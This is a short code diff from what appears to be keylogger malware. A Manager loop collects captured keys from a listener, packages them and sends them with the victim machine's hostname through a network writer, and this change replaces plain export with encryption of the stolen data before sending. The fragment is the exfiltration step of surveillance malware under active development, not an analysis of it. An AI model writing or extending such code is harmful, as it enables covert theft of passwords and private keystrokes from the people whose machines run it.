@@ -29,7 +29,8 @@ class Manager:
             temp_data = self.listener.get_keys()
             if temp_data:
                 data = Package(temp_data)
-                data = str(data.export_package())
+                print(data)
+                data = data.encrypt()
                 nw = NetworkWriter()
                 nw.send_data({"machine": hostname,"data": data})
     def stop(self):
